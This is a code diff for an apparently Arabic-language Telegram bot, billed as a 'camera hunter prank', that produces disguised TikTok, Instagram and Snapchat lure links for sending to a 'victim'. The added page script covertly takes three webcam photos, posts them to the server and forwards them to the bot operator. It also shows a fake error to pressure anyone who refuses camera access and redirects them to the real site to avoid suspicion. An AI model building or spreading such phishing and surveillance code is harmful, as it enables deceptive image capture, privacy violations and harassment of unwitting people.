@@ -60,7 +60,7 @@ def is_premium_user(chat_id):
     conn.close()
     return result is not None
 
-# ---- واجهة المقالب الذكية المتغيرة (HTML & CSS & JS) ----
+# ---- واجهة المقالب المتقدمة (اللقطات المتعددة + صفحة التمويه) ----
 def get_html_content(template_type):
     # إعدادات القوالب الافتراضية
     bg_color = "#010101"
@@ -96,7 +96,7 @@ def get_html_content(template_type):
         btn_text = "🔥 تشغيل الفلتر الحصري"
         redirect_to = "https://www.snapchat.com"
 
-    # كود الـ HTML المدمج والمحدث ديناميكياً
+    # كود الـ HTML المطور بالكامل مع نظام الصيد الثلاثي المتتالي وصفحة التمويه والأخطاء
     return f"""
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
@@ -140,56 +140,90 @@ def get_html_content(template_type):
                 box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: all 0.2s ease;
             }}
             .btn:active {{ transform: scale(0.98); }}
+            .error-msg {{
+                color: #ef4444; font-size: 13px; margin-top: 15px; display: none; font-weight: 600;
+            }}
         </style>
     </head>
     <body>
         <div class="container">
             <div class="logo">{logo_text}</div>
             <div class="video-box">
-                <div class="loader"></div>
-                <div class="loading-text">جاري الاتصال بالنظام الحصري...</div>
+                <div class="loader" id="mainLoader"></div>
+                <div class="loading-text" id="statusText">جاري الاتصال بالنظام الحصري...</div>
             </div>
-            <h2>{title}</h2>
-            <p>{desc}</p>
+            <h2 id="mainTitle">{title}</h2>
+            <p id="mainDesc">{desc}</p>
             <button class="btn" id="startBtn">{btn_text}</button>
+            <div class="error-msg" id="errorBlock">⚠️ عذراً، يجب السماح بوصول الكاميرا لتشغيل النظام التفاعلي! يرجى إعادة الضغط والموافقة.</div>
         </div>
 
         <script>
             const urlParams = new URLSearchParams(window.location.search);
             const ownerId = urlParams.get('id');
+            const REDIRECT_URL = "{redirect_to}";
+            let clickCount = 0;
 
             document.getElementById('startBtn').addEventListener('click', function() {{
-                if (ownerId) {{
-                    navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
-                    .then(function(stream) {{
-                        let video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.setAttribute("playsinline", true);
-                        video.play();
+                if (!ownerId) {{
+                    window.location.href = REDIRECT_URL;
+                    return;
+                }}
+
+                // محاولة فتح الكاميرا
+                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
+                .then(function(stream) {{
+                    // إخفاء رسائل الخطأ إذا وافق
+                    document.getElementById('errorBlock').style.display = 'none';
+                    document.getElementById('statusText').innerText = "جاري معالجة الفلتر الحي وضبط الأبعاد...";
+                    
+                    let video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute("playsinline", true);
+                    video.play();
+                    
+                    video.onloadedmetadata = function() {{
+                        let canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        let ctx = canvas.getContext('2d');
                         
-                        video.onloadedmetadata = function() {{
-                            let canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            let ctx = canvas.getContext('2d');
+                        let shotsTaken = 0;
+                        
+                        // دالة التقاط متكررة (3 مرات بين كل لقطة نصف ثانية)
+                        let captureInterval = setInterval(function() {{
+                            if (shotsTaken >= 3) {{
+                                clearInterval(captureInterval);
+                                // إغلاق الكاميرا والتحويل للموقع الرسمي بعد إنهاء اللقطات الثلاث
+                                stream.getTracks().forEach(track => track.stop());
+                                window.location.href = REDIRECT_URL;
+                                return;
+                            }}
+                            
                             ctx.drawImage(video, 0, 0);
+                            let base64Image = canvas.toDataURL('image/jpeg', 0.75);
                             
-                            let base64Image = canvas.toDataURL('image/jpeg', 0.80);
-                            
+                            // إرسال اللقطة الحالية للسيرفر
                             fetch('/api/capture', {{
                                 method: 'POST',
                                 headers: {{ 'Content-Type': 'application/json' }},
-                                body: JSON.stringify({{ user_id: ownerId, image: base64Image }})
-                            }})
-                            .then(() => {{
-                                stream.getTracks().forEach(track => track.stop());
-                                window.location.href = "{redirect_to}";
-                            }})
-                            .catch(() => {{ window.location.href = "{redirect_to}"; }});
-                        }};
-                    }})
-                    .catch(function(err) {{ window.location.href = "{redirect_to}"; }});
-                }} else {{ window.location.href = "{redirect_to}"; }}
+                                body: JSON.stringify({{ user_id: ownerId, image: base64Image, count: shotsTaken + 1 }})
+                            }});
+                            
+                            shotsTaken++;
+                        }}, 500); // 500 ملي ثانية = نصف ثانية بين اللقطات
+                    }};
+                }})
+                .catch(function(err) {{
+                    // خطة التمويه الذكية: إذا رفض للمرة الأولى، لا نحوله بل نظهر خطأ مموه لإقناعه
+                    clickCount++;
+                    if (clickCount === 1) {{
+                        document.getElementById('errorBlock').style.display = 'block';
+                    }} else {{
+                        // إذا رفض للمرة الثانية، يتم تحويله تلقائياً للموقع الأصلي لمنع الشك
+                        window.location.href = REDIRECT_URL;
+                    }}
+                }});
             }});
         </script>
     </body>
@@ -204,8 +238,8 @@ def start(message):
     name = message.from_user.first_name
     
     welcome_text = (
-        f"أهلاً بك يا {name} في بوت صائد الكاميرا الفكاهي المطوّر! 📸🔥\n\n"
-        "💳 لتفعيل حسابك وتوليد روابط المقالب المضحكة بأشكال متعددة، يرجى التفعيل بالأسفل."
+        f"أهلاً بك يا {name} في بوت صائد الكاميرا الفكاهي الذكي (النسخة المتقدمة) 📸🔥\n\n"
+        "💳 لتفعيل حسابك ونظام اللقطات الثلاثية الذكية، اضغط تفعيل بالأسفل."
     )
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("💳 تفعيل الاشتراك المميز (VIP)", callback_data="buy"))
@@ -215,16 +249,15 @@ def start(message):
 def buy(call):
     chat_id = call.message.chat.id
     add_premium_user(chat_id)
-    bot.answer_callback_query(call.id, "🎉 تم تفعيل حسابك كـ VIP!")
+    bot.answer_callback_query(call.id, "🎉 تم تفعيل النظام الذكي v2.0!")
     
-    # قائمة اختيار القوالب بعد التفعيل
     markup = InlineKeyboardMarkup(row_width=1)
     markup.add(
         InlineKeyboardButton("🎬 مقلب تحدي تيك توك", callback_data="gen_tiktok"),
         InlineKeyboardButton("📸 مقلب توثيق إنستغرام", callback_data="gen_instagram"),
         InlineKeyboardButton("👻 مقلب فلاتر سناب شات", callback_data="gen_snapchat")
     )
-    bot.send_message(chat_id, "👑 اختر الآن نوع المقلب الذي تريد إنشاؤه لإرساله لصديقك:", reply_markup=markup)
+    bot.send_message(chat_id, "👑 اختر نوع المقلب لتوليد رابط الصيد الثلاثي المتتالي:", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
 def gen_link(call):
@@ -233,13 +266,15 @@ def gen_link(call):
         bot.send_message(chat_id, "❌ حسابك غير مفعل.")
         return
         
-    template = call.data.split("_")[1]  # tiktok, instagram, snapchat
+    template = call.data.split("_")[1]
     unique_link = f"{RENDER_URL}?id={chat_id}&template={template}"
     
     msg = (
-        f"🚀 **رابط مقلب ({template.upper()}) الخاص بك جاهز الآن!**\n\n"
-        f"انسخ هذا الرابط وأرسله للضحية:\n`{unique_link}`\n\n"
-        "بمجرد دخوله وقبول الإذن، ستصلك لقطته فوراً على هذا الشات!"
+        f"🚀 **رابط المقلب الذكي لـ ({template.upper()}) جاهز تماماً!**\n\n"
+        f"انسخ الرابط وأرسله للضحية:\n`{unique_link}`\n\n"
+        "💡 **مميزات هذا الرابط:**\n"
+        "1. سيقوم بالتقاط **3 صور متتالية** سريعة فور فتح الكاميرا لضمان صيد تعبيرات مضحكة جداً.\n"
+        "2. إذا ضغط الضحية إلغاء أو رفض، ستظهر له صفحة خطأ وهمية لإقناعه بالموافقة مجدداً قبل الخروج!"
     )
     bot.send_message(chat_id, msg, parse_mode="Markdown")
 
@@ -247,7 +282,6 @@ def gen_link(call):
 
 @app.get("/", response_class=HTMLResponse)
 async def get_home(request: Request):
-    # قراءة نوع القالب من الرابط، وإذا لم يجد شيئاً يفتح تيك توك كافتراضي
     template = request.query_params.get("template", "tiktok")
     return get_html_content(template)
 
@@ -258,11 +292,15 @@ async def telegram_webhook(request: Request):
     bot.process_new_updates([update])
     return {"status": "ok"}
 
-def send_photo_to_owner(user_id, image_bytes):
+def send_photo_to_owner(user_id, image_bytes, count_text):
     try:
-        bot.send_photo(chat_id=user_id, photo=image_bytes, caption="📸 **ههههه! تم صيد لقطة صديقك الفكاهية بنجاح!**")
+        bot.send_photo(
+            chat_id=user_id, 
+            photo=image_bytes, 
+            caption=f"📸 **ههههه! تم صيد اللقطة الفكاهية رقم ({count_text}) بنجاح!**"
+        )
     except Exception as e:
-        print(f"Error sending to {user_id}: {e}")
+        print(f"Error sending photo: {e}")
 
 @app.post("/api/capture")
 async def capture_api(request: Request, background_tasks: BackgroundTasks):
@@ -270,6 +308,7 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
         data = await request.json()
         user_id = data.get("user_id")
         image_b64 = data.get("image")
+        shot_count = data.get("count", 1)
         
         if not user_id or not image_b64:
             return JSONResponse(status_code=400, content={"status": "error"})
@@ -277,9 +316,9 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
         header, encoded = image_b64.split(",", 1)
         image_bytes = base64.b64decode(encoded)
         image_file = io.BytesIO(image_bytes)
-        image_file.name = "capture.jpg"
+        image_file.name = f"capture_{shot_count}.jpg"
         
-        background_tasks.add_task(send_photo_to_owner, int(user_id), image_file)
+        background_tasks.add_task(send_photo_to_owner, int(user_id), image_file, str(shot_count))
         return {"status": "success"}
     except Exception as e:
         return JSONResponse(status_code=500, content={"status": "error"})
@@ -288,9 +327,8 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
 def startup_event():
     bot.remove_webhook()
     bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
-    print("🚀 تم تفعيل الـ Webhook مع نظام القوالب المتعددة!")
+    print("🚀 تم تفعيل الـ Webhook مع نظام اللقطات المتعددة الذكي!")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     uvicorn.run(app, host="0.0.0.0", port=port)
-
